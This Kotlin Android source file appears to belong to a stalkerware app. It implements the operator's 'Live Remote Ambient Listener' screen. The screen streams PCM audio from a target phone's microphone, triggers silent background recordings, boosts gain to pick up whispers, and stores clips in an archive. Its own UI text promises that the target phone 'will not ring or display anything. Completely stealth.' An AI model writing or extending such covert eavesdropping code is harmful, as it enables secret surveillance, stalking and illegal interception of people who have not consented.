package com.example.kinetix.ui.features

import android.media.*
import android.util.Base64
import android.util.Log
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.nio.ByteOrder
import kotlin.random.Random

data class AudioItem(
    val id: String,
    val name: String,
    val duration: String,
    val size: String,
    val date: String,
    val base64: String? = null,
    val r2Url: String? = null
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AudioScreen(deviceId: String, onBack: () -> Unit) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()

    // Live Streaming State
    var isLiveListening by remember { mutableStateOf(false) }
    var liveMicStatus by remember { mutableStateOf("IDLE") } // "STREAMING", "PAUSED_CONFLICT", "IDLE"
    var currentDecibels by remember { mutableIntStateOf(30) }
    var selectedQuality by remember { mutableStateOf("HD") } // "HD", "ECO"
    var audioGainBoost by remember { mutableFloatStateOf(1.0f) } // 1.0f, 1.5f, 2.0f
    var audioOutputRoute by remember { mutableStateOf("SPEAKER") } // "SPEAKER", "EARPIECE", "BLUETOOTH"

    // Quick Snippet Recording State
    var isRecordingSnippet by remember { mutableStateOf(false) }
    var snippetCountdown by remember { mutableIntStateOf(10) }
    var statusMessage by remember { mutableStateOf<String?>(null) }

    // Archive & Playback State
    val audioList = remember { mutableStateListOf<AudioItem>() }
    var currentlyPlayingId by remember { mutableStateOf<String?>(null) }
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }

    // Live Native AudioTrack Stream Engine (16kHz PCM Mono)
    var liveAudioTrack by remember { mutableStateOf<AudioTrack?>(null) }
    var lastPlayedSequence by remember { mutableIntStateOf(0) }

    // Audio Output Routing Engine (Speaker, Earpiece, Bluetooth)
    fun setAudioOutputRouting(route: String) {
        audioOutputRoute = route
        try {
            val audioManager = context.getSystemService(android.content.Context.AUDIO_SERVICE) as? AudioManager ?: return
            audioManager.mode = AudioManager.MODE_IN_COMMUNICATION

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                val devices = audioManager.availableCommunicationDevices
                when (route) {
                    "SPEAKER" -> {
                        val speaker = devices.firstOrNull { it.type == AudioDeviceInfo.TYPE_BUILTIN_SPEAKER }
                        if (speaker != null) {
                            audioManager.setCommunicationDevice(speaker)
                        } else {
                            audioManager.clearCommunicationDevice()
                            audioManager.isSpeakerphoneOn = true
                        }
                    }
                    "EARPIECE" -> {
                        val earpiece = devices.firstOrNull { it.type == AudioDeviceInfo.TYPE_BUILTIN_EARPIECE }
                        if (earpiece != null) {
                            audioManager.setCommunicationDevice(earpiece)
                        } else {
                            audioManager.clearCommunicationDevice()
                            audioManager.isSpeakerphoneOn = false
                        }
                    }
                    "BLUETOOTH" -> {
                        val bt = devices.firstOrNull {
                            it.type == AudioDeviceInfo.TYPE_BLUETOOTH_SCO ||
                            it.type == AudioDeviceInfo.TYPE_BLE_HEADSET ||
                            it.type == AudioDeviceInfo.TYPE_WIRED_HEADSET ||
                            it.type == AudioDeviceInfo.TYPE_WIRED_HEADPHONES
                        }
                        if (bt != null) {
                            audioManager.setCommunicationDevice(bt)
                        } else {
                            audioManager.isSpeakerphoneOn = false
                            try {
                                audioManager.startBluetoothSco()
                                audioManager.isBluetoothScoOn = true
                            } catch (_: Exception) {}
                        }
                    }
                }
            } else {
                when (route) {
                    "SPEAKER" -> {
                        try { audioManager.stopBluetoothSco() } catch (_: Exception) {}
                        audioManager.isBluetoothScoOn = false
                        audioManager.isSpeakerphoneOn = true
                    }
                    "EARPIECE" -> {
                        try { audioManager.stopBluetoothSco() } catch (_: Exception) {}
                        audioManager.isBluetoothScoOn = false
                        audioManager.isSpeakerphoneOn = false
                    }
                    "BLUETOOTH" -> {
                        audioManager.isSpeakerphoneOn = false
                        try {
                            audioManager.startBluetoothSco()
                            audioManager.isBluetoothScoOn = true
                        } catch (_: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("AudioScreen", "Audio output routing failed: ${e.message}")
        }
    }

    // Pulse Animation for Live Streaming
    val infiniteTransition = rememberInfiniteTransition(label = "LivePulse")
    val pulseScale by infiniteTransition.animateFloat(
        initialValue = 0.95f,
        targetValue = 1.08f,
        animationSpec = infiniteRepeatable(
            animation = tween(800, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "PulseScale"
    )

    // Helper: Fetch audio recordings archive
    suspend fun fetchAudioList() {
        withContext(Dispatchers.IO) {
            val client = com.example.kinetix.network.KinetixApiClient(context)
            val res = client.getAudioList(deviceId)
            if (res.isSuccess) {
                val arr = res.getOrNull()
                if (arr != null) {
                    val items = mutableListOf<AudioItem>()
                    for (i in 0 until arr.length()) {
                        val item = arr.getJSONObject(i)
                        items.add(
                            AudioItem(
                                id = item.optString("id", "rec_$i"),
                                name = item.optString("name", "audio_clip.m4a"),
                                duration = item.optString("duration", "0:10"),
                                size = item.optString("size", "160 KB"),
                                date = item.optString("date", "Just now"),
                                base64 = item.optString("base64").takeIf { b -> b.isNotBlank() && b != "null" },
                                r2Url = item.optString("r2Url").takeIf { u -> u.isNotBlank() && u != "null" }
                            )
                        )
                    }
                    withContext(Dispatchers.Main) {
                        audioList.clear()
                        audioList.addAll(items)
                    }
                }
            }
        }
    }

    // Polling loop for Audio Archive List
    LaunchedEffect(Unit) {
        while (true) {
            fetchAudioList()
            delay(4000)
        }
    }

    // Live Real-Time PCM AudioStream Engine via AudioTrack
    LaunchedEffect(isLiveListening) {
        if (!isLiveListening) {
            try {
                liveAudioTrack?.stop()
                liveAudioTrack?.release()
            } catch (_: Exception) {}
            liveAudioTrack = null
            liveMicStatus = "IDLE"
            currentDecibels = 25
            return@LaunchedEffect
        }

        setAudioOutputRouting(audioOutputRoute)

        val sampleRate = 16000
        val minBufSize = AudioTrack.getMinBufferSize(
            sampleRate,
            AudioFormat.CHANNEL_OUT_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        val track = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            AudioTrack.Builder()
                .setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                        .build()
                )
                .setAudioFormat(
                    AudioFormat.Builder()
                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                        .setSampleRate(sampleRate)
                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                        .build()
                )
                .setBufferSizeInBytes((minBufSize * 4).coerceAtLeast(32000))
                .setTransferMode(AudioTrack.MODE_STREAM)
                .build()
        } else {
            @Suppress("DEPRECATION")
            AudioTrack(
                AudioManager.STREAM_VOICE_CALL,
                sampleRate,
                AudioFormat.CHANNEL_OUT_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                (minBufSize * 4).coerceAtLeast(32000),
                AudioTrack.MODE_STREAM
            )
        }

        try {
            track.play()
        } catch (_: Exception) {}
        liveAudioTrack = track

        while (isLiveListening) {
            withContext(Dispatchers.IO) {
                try {
                    val client = com.example.kinetix.network.KinetixApiClient(context)
                    val streamRes = client.getLiveAudioStream(deviceId)
                    if (streamRes.isSuccess) {
                        val obj = streamRes.getOrNull()
                        if (obj != null) {
                            val status = obj.optString("micStatus", "STREAMING")
                            val db = obj.optInt("decibels", 35)
                            val seq = obj.optInt("sequence", 0)
                            val chunkB64 = obj.optString("chunk")

                            withContext(Dispatchers.Main) {
                                liveMicStatus = status
                                currentDecibels = db
                            }

                            // Write clean 16-bit PCM ShortArray to AudioTrack
                            if (status == "STREAMING" && seq > lastPlayedSequence && !chunkB64.isNullOrBlank() && chunkB64 != "null") {
                                lastPlayedSequence = seq
                                val pcmBytes = Base64.decode(chunkB64, Base64.DEFAULT)

                                if (pcmBytes.size >= 2) {
                                    val shortBuf = ByteBuffer.wrap(pcmBytes).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer()
                                    val shortArray = ShortArray(shortBuf.remaining())
                                    shortBuf.get(shortArray)

                                    // Apply smooth digital volume gain boost if configured
                                    if (audioGainBoost != 1.0f) {
                                        for (i in shortArray.indices) {
                                            shortArray[i] = (shortArray[i] * audioGainBoost).toInt().coerceIn(-32768, 32767).toShort()
                                        }
                                    }

                                    track.write(shortArray, 0, shortArray.size)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w("AudioScreen", "Live audio stream fetch error: ${e.message}")
                }
            }
            delay(400) // 400ms fast streaming poll
        }
    }

    DisposableEffect(Unit) {
        onDispose {
            mediaPlayer?.release()
            mediaPlayer = null
            try {
                liveAudioTrack?.stop()
                liveAudioTrack?.release()
            } catch (_: Exception) {}
            liveAudioTrack = null
            try {
                val audioManager = context.getSystemService(android.content.Context.AUDIO_SERVICE) as? AudioManager
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    audioManager?.clearCommunicationDevice()
                }
                audioManager?.mode = AudioManager.MODE_NORMAL
                audioManager?.isSpeakerphoneOn = false
                audioManager?.stopBluetoothSco()
                audioManager?.isBluetoothScoOn = false
            } catch (_: Exception) {}
        }
    }

    // Play/Pause archive audio item
    fun playAudio(item: AudioItem) {
        try {
            if (currentlyPlayingId == item.id) {
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                currentlyPlayingId = null
                return
            }

            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null

            val r2 = item.r2Url
            val b64 = item.base64

            if (!r2.isNullOrBlank()) {
                val player = MediaPlayer().apply {
                    setDataSource(r2)
                    prepareAsync()
                    setOnPreparedListener { start() }
                    setOnCompletionListener {
                        currentlyPlayingId = null
                    }
                    setOnErrorListener { _, _, _ ->
                        currentlyPlayingId = null
                        true
                    }
                }
                mediaPlayer = player
                currentlyPlayingId = item.id
            } else if (!b64.isNullOrBlank()) {
                val bytes = Base64.decode(b64, Base64.DEFAULT)
                val tempFile = File(context.cacheDir, "play_${item.id}.m4a")
                FileOutputStream(tempFile).use { it.write(bytes) }

                val player = MediaPlayer().apply {
                    setDataSource(tempFile.absolutePath)
                    prepare()
                    setOnCompletionListener {
                        currentlyPlayingId = null
                    }
                    start()
                }
                mediaPlayer = player
                currentlyPlayingId = item.id
            }
        } catch (_: Exception) {
            statusMessage = "Unable to play audio."
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text("Microphone & Audio", fontWeight = FontWeight.Bold, fontSize = 18.sp)
                        Text("Live Remote Ambient Listener", fontSize = 11.sp, color = MaterialTheme.colorScheme.outline)
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    IconButton(onClick = { coroutineScope.launch { fetchAudioList() } }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh", tint = Color(0xFF0284C7))
                    }
                }
            )
        }
    ) { padding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp),
            contentPadding = PaddingValues(bottom = 24.dp)
        ) {
            // 1. HERO LIVE LISTENING CARD
            item {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(22.dp),
                    color = if (isLiveListening) Color(0xFF0A192F) else Color(0xFFF8FAFC),
                    border = androidx.compose.foundation.BorderStroke(
                        1.5.dp,
                        if (isLiveListening) Color(0xFF10B981) else Color(0xFFE2E8F0)
                    ),
                    shadowElevation = if (isLiveListening) 6.dp else 2.dp
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(20.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        // Live Status Badge
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier
                                .clip(RoundedCornerShape(20.dp))
                                .background(
                                    when (liveMicStatus) {
                                        "STREAMING" -> Color(0xFF10B981).copy(alpha = 0.15f)
                                        "PAUSED_CONFLICT" -> Color(0xFFF59E0B).copy(alpha = 0.15f)
                                        else -> Color(0xFF64748B).copy(alpha = 0.12f)
                                    }
                                )
                                .padding(horizontal = 12.dp, vertical = 6.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .clip(CircleShape)
                                    .background(
                                        when (liveMicStatus) {
                                            "STREAMING" -> Color(0xFF10B981)
                                            "PAUSED_CONFLICT" -> Color(0xFFF59E0B)
                                            else -> Color(0xFF94A3B8)
                                        }
                                    )
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = when (liveMicStatus) {
                                    "STREAMING" -> "LIVE STREAMING (16 kHz CONTINUOUS PCM)"
                                    "PAUSED_CONFLICT" -> "PAUSED: MIC IN USE BY PHONE CALL / APP"
                                    else -> "STANDBY • READY TO LISTEN"
                                },
                                fontSize = 10.5.sp,
                                fontWeight = FontWeight.Bold,
                                color = when (liveMicStatus) {
                                    "STREAMING" -> Color(0xFF10B981)
                                    "PAUSED_CONFLICT" -> Color(0xFFF59E0B)
                                    else -> Color(0xFF64748B)
                                }
                            )
                        }

                        Spacer(modifier = Modifier.height(18.dp))

                        // Center Pulsing Visualizer Icon
                        Box(
                            modifier = Modifier
                                .size(90.dp)
                                .scale(if (isLiveListening && liveMicStatus == "STREAMING") pulseScale else 1f)
                                .clip(CircleShape)
                                .background(
                                    if (isLiveListening) {
                                        Brush.radialGradient(
                                            listOf(Color(0xFF10B981).copy(alpha = 0.35f), Color(0xFF0F766E).copy(alpha = 0.15f))
                                        )
                                    } else {
                                        Brush.radialGradient(
                                            listOf(Color(0xFFE2E8F0), Color(0xFFCBD5E1).copy(alpha = 0.3f))
                                        )
                                    }
                                ),
                            contentAlignment = Alignment.Center
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(68.dp)
                                    .clip(CircleShape)
                                    .background(
                                        if (isLiveListening) Color(0xFF10B981) else Color(0xFF0284C7)
                                    ),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    if (isLiveListening) Icons.Default.Hearing else Icons.Default.Mic,
                                    contentDescription = null,
                                    tint = Color.White,
                                    modifier = Modifier.size(34.dp)
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(14.dp))

                        Text(
                            text = if (isLiveListening) {
                                if (liveMicStatus == "PAUSED_CONFLICT") "Paused (Auto-Resuming Once Call Ends)" else "Live Ambient Listening Active"
                            } else {
                                "Remote Live Listen (Silent Background)"
                            },
                            fontWeight = FontWeight.Bold,
                            fontSize = 16.sp,
                            color = if (isLiveListening) Color.White else Color(0xFF1E293B)
                        )

                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "Target phone will not ring or display anything. Completely stealth.",
                            fontSize = 11.sp,
                            color = if (isLiveListening) Color(0xFF94A3B8) else Color(0xFF64748B),
                            textAlign = TextAlign.Center
                        )

                        Spacer(modifier = Modifier.height(16.dp))

                        // Animated Dynamic Sound Waveform Bars (16 Bars)
                        Row(
                            horizontalArrangement = Arrangement.spacedBy(4.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.height(42.dp)
                        ) {
                            val barCount = 16
                            for (i in 0 until barCount) {
                                val dynamicHeight = if (isLiveListening && liveMicStatus == "STREAMING") {
                                    val factor = (currentDecibels / 100f).coerceIn(0.2f, 1f)
                                    (10 + (i % 5) * 6 * factor + Random.nextInt(0, 10) * factor).dp
                                } else {
                                    6.dp
                                }
                                Box(
                                    modifier = Modifier
                                        .width(4.dp)
                                        .height(dynamicHeight)
                                        .clip(RoundedCornerShape(2.dp))
                                        .background(
                                            if (isLiveListening) {
                                                if (liveMicStatus == "PAUSED_CONFLICT") Color(0xFFF59E0B) else Color(0xFF10B981)
                                            } else {
                                                Color(0xFFCBD5E1)
                                            }
                                        )
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // Decibel & Ambient VU Gauge
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.Center
                        ) {
                            Icon(
                                Icons.Default.GraphicEq,
                                contentDescription = null,
                                tint = if (isLiveListening) Color(0xFF10B981) else Color(0xFF64748B),
                                modifier = Modifier.size(16.dp)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = if (isLiveListening && liveMicStatus == "STREAMING") {
                                    val desc = when {
                                        currentDecibels < 40 -> "Quiet Ambient"
                                        currentDecibels < 65 -> "Normal Voice / Conversation"
                                        else -> "Loud Ambient Sound"
                                    }
                                    "$currentDecibels dB • $desc"
                                } else {
                                    "Standby • 32,000 Hz AAC Transmission"
                                },
                                fontSize = 11.5.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (isLiveListening) Color(0xFF38BDF8) else Color(0xFF64748B)
                            )
                        }

                        Spacer(modifier = Modifier.height(18.dp))

                        // Primary Live Listen Action Button
                        Button(
                            onClick = {
                                val targetState = !isLiveListening
                                isLiveListening = targetState
                                coroutineScope.launch {
                                    val client = com.example.kinetix.network.KinetixApiClient(context)
                                    if (targetState) {
                                        client.startLiveAudio(deviceId, selectedQuality)
                                        statusMessage = "Connecting high quality live audio stream..."
                                    } else {
                                        client.stopLiveAudio(deviceId)
                                        statusMessage = "Live listening stopped."
                                    }
                                }
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(48.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (isLiveListening) Color(0xFFEF4444) else Color(0xFF10B981)
                            )
                        ) {
                            Icon(
                                if (isLiveListening) Icons.Default.Stop else Icons.Default.Hearing,
                                contentDescription = null,
                                tint = Color.White
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                if (isLiveListening) "Stop Live Listening" else "Start Live Remote Listening",
                                fontWeight = FontWeight.Bold,
                                fontSize = 14.sp,
                                color = Color.White
                            )
                        }
                    }
                }
            }

            // 2. AUDIO OUTPUT ROUTE SWITCHER (LOUDSPEAKER, EARPIECE, BLUETOOTH)
            item {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    color = Color.White,
                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    shadowElevation = 1.dp
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    Icons.Default.VolumeUp,
                                    contentDescription = null,
                                    tint = Color(0xFF0D9488),
                                    modifier = Modifier.size(18.dp)
                                )
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("Audio Output Route", fontWeight = FontWeight.Bold, fontSize = 13.5.sp)
                            }
                            Text(
                                text = when (audioOutputRoute) {
                                    "SPEAKER" -> "Loudspeaker"
                                    "EARPIECE" -> "Private Call Earpiece"
                                    else -> "Bluetooth / Headset"
                                },
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = Color(0xFF0D9488)
                            )
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            listOf(
                                Triple("SPEAKER", "Loudspeaker", Icons.Default.VolumeUp),
                                Triple("EARPIECE", "Earpiece", Icons.Default.PhoneInTalk),
                                Triple("BLUETOOTH", "Bluetooth", Icons.Default.BluetoothAudio)
                            ).forEach { (route, label, icon) ->
                                val isSelected = audioOutputRoute == route
                                Surface(
                                    onClick = {
                                        setAudioOutputRouting(route)
                                    },
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(10.dp),
                                    color = if (isSelected) Color(0xFFCCFBF1) else Color(0xFFF8FAFC),
                                    border = if (isSelected) androidx.compose.foundation.BorderStroke(1.5.dp, Color(0xFF0D9488)) else androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFE2E8F0))
                                ) {
                                    Column(
                                        horizontalAlignment = Alignment.CenterHorizontally,
                                        modifier = Modifier.padding(vertical = 10.dp, horizontal = 4.dp)
                                    ) {
                                        Icon(
                                            icon,
                                            contentDescription = null,
                                            tint = if (isSelected) Color(0xFF0F766E) else Color(0xFF64748B),
                                            modifier = Modifier.size(20.dp)
                                        )
                                        Spacer(modifier = Modifier.height(4.dp))
                                        Text(
                                            text = label,
                                            fontSize = 11.sp,
                                            fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium,
                                            color = if (isSelected) Color(0xFF0F766E) else Color(0xFF475569),
                                            textAlign = TextAlign.Center
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // 3. AUDIO TUNING & SENSITIVITY CONTROLS
            item {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    color = Color.White,
                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    shadowElevation = 1.dp
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.Tune, contentDescription = null, tint = Color(0xFF0284C7), modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("Audio Transmission Tuning", fontWeight = FontWeight.Bold, fontSize = 13.5.sp)
                            }
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Gain Boost Chips
                            listOf(
                                1.0f to "1.0x Normal",
                                1.5f to "1.5x Boost",
                                2.0f to "2.0x Whisper"
                            ).forEach { (gain, label) ->
                                val isSelected = audioGainBoost == gain
                                Surface(
                                    onClick = {
                                        audioGainBoost = gain
                                    },
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(8.dp),
                                    color = if (isSelected) Color(0xFFE0F2FE) else Color(0xFFF1F5F9),
                                    border = if (isSelected) androidx.compose.foundation.BorderStroke(1.dp, Color(0xFF0284C7)) else null
                                ) {
                                    Text(
                                        text = label,
                                        fontSize = 11.sp,
                                        fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Medium,
                                        color = if (isSelected) Color(0xFF0284C7) else Color(0xFF475569),
                                        textAlign = TextAlign.Center,
                                        modifier = Modifier.padding(vertical = 8.dp)
                                    )
                                }
                            }
                        }
                    }
                }
            }

            // 3. QUICK REMOTE SNIPPET CAPTURE
            item {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    color = Color.White,
                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFE2E8F0)),
                    shadowElevation = 1.dp
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.GraphicEq, contentDescription = null, tint = Color(0xFF7C3AED), modifier = Modifier.size(18.dp))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Record Remote Snippet to Archive", fontWeight = FontWeight.Bold, fontSize = 13.5.sp)
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            listOf(
                                10 to "10s Clip",
                                30 to "30s Snippet",
                                60 to "60s Audio"
                            ).forEach { (seconds, label) ->
                                Button(
                                    onClick = {
                                        if (!isRecordingSnippet) {
                                            isRecordingSnippet = true
                                            snippetCountdown = seconds
                                            statusMessage = "Recording $label silently in background..."
                                            coroutineScope.launch {
                                                val client = com.example.kinetix.network.KinetixApiClient(context)
                                                client.triggerAudioRecord(deviceId, seconds)
                                                for (sec in seconds downTo 1) {
                                                    snippetCountdown = sec
                                                    delay(1000)
                                                }
                                                isRecordingSnippet = false
                                                statusMessage = "Uploading snippet from phone..."
                                                delay(2000)
                                                fetchAudioList()
                                                statusMessage = "Audio snippet saved to archive!"
                                            }
                                        }
                                    },
                                    enabled = !isRecordingSnippet,
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(10.dp),
                                    colors = ButtonDefaults.buttonColors(
                                        containerColor = Color(0xFF7C3AED)
                                    ),
                                    contentPadding = PaddingValues(vertical = 8.dp)
                                ) {
                                    Text(
                                        if (isRecordingSnippet && snippetCountdown > 0) "${snippetCountdown}s" else label,
                                        fontSize = 11.5.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                }
                            }
                        }

                        if (statusMessage != null) {
                            Spacer(modifier = Modifier.height(8.dp))
                            Text(
                                text = statusMessage!!,
                                fontSize = 11.sp,
                                color = Color(0xFF0284C7),
                                fontWeight = FontWeight.SemiBold
                            )
                        }
                    }
                }
            }

            // 4. AUDIO ARCHIVE & SAVED RECORDINGS
            item {
                Row(
                    modifier = Modifier.fillMaxWidth().padding(horizontal = 4.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        "Audio Recordings Archive (${audioList.size})",
                        fontWeight = FontWeight.Bold,
                        fontSize = 14.5.sp,
                        color = Color(0xFF1E293B)
                    )
                    Text(
                        "${audioList.size} Saved",
                        fontSize = 11.sp,
                        color = Color(0xFF64748B)
                    )
                }
            }

            if (audioList.isEmpty()) {
                item {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(16.dp),
                        color = Color(0xFFF8FAFC)
                    ) {
                        Column(
                            modifier = Modifier.fillMaxWidth().padding(32.dp),
                            horizontalAlignment = Alignment.CenterHorizontally
                        ) {
                            Icon(Icons.Outlined.MicOff, contentDescription = null, tint = Color(0xFF94A3B8), modifier = Modifier.size(36.dp))
                            Spacer(modifier = Modifier.height(8.dp))
                            Text("No audio recordings captured yet.", fontSize = 13.sp, color = Color(0xFF64748B), fontWeight = FontWeight.Medium)
                            Text("Tap '10s Clip' above or enable live session recording.", fontSize = 11.sp, color = Color(0xFF94A3B8))
                        }
                    }
                }
            } else {
                items(audioList) { audio ->
                    val isPlaying = currentlyPlayingId == audio.id
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(14.dp),
                        color = if (isPlaying) Color(0xFFE0F2FE) else Color.White,
                        border = androidx.compose.foundation.BorderStroke(
                            1.dp,
                            if (isPlaying) Color(0xFF0284C7) else Color(0xFFE2E8F0)
                        ),
                        shadowElevation = 1.dp
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                // Play / Stop Icon Button
                                Box(
                                    modifier = Modifier
                                        .size(42.dp)
                                        .clip(CircleShape)
                                        .background(
                                            if (isPlaying) Color(0xFF0284C7) else Color(0xFFF1F5F9)
                                        )
                                        .clickable { playAudio(audio) },
                                    contentAlignment = Alignment.Center
                                ) {
                                    Icon(
                                        if (isPlaying) Icons.Default.Stop else Icons.Default.PlayArrow,
                                        contentDescription = null,
                                        tint = if (isPlaying) Color.White else Color(0xFF0284C7),
                                        modifier = Modifier.size(22.dp)
                                    )
                                }

                                Spacer(modifier = Modifier.width(12.dp))

                                Column(modifier = Modifier.weight(1f)) {
                                    Text(audio.name, fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF0F172A))
                                    Spacer(modifier = Modifier.height(2.dp))
                                    Text("${audio.date} • ${audio.duration}", fontSize = 11.sp, color = Color(0xFF64748B))
                                }

                                Surface(
                                    shape = RoundedCornerShape(6.dp),
                                    color = Color(0xFFF1F5F9)
                                ) {
                                    Text(
                                        text = audio.size,
                                        fontSize = 10.5.sp,
                                        fontWeight = FontWeight.SemiBold,
                                        color = Color(0xFF475569),
                                        modifier = Modifier.padding(horizontal = 7.dp, vertical = 3.dp)
                                    )
                                }

                                Spacer(modifier = Modifier.width(8.dp))

                                // Delete Button
                                IconButton(
                                    onClick = {
                                        coroutineScope.launch {
                                            val client = com.example.kinetix.network.KinetixApiClient(context)
                                            client.deleteAudioRecording(deviceId, audio.id)
                                            audioList.remove(audio)
                                        }
                                    },
                                    modifier = Modifier.size(28.dp)
                                ) {
                                    Icon(Icons.Outlined.Delete, contentDescription = "Delete", tint = Color(0xFF94A3B8), modifier = Modifier.size(18.dp))
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
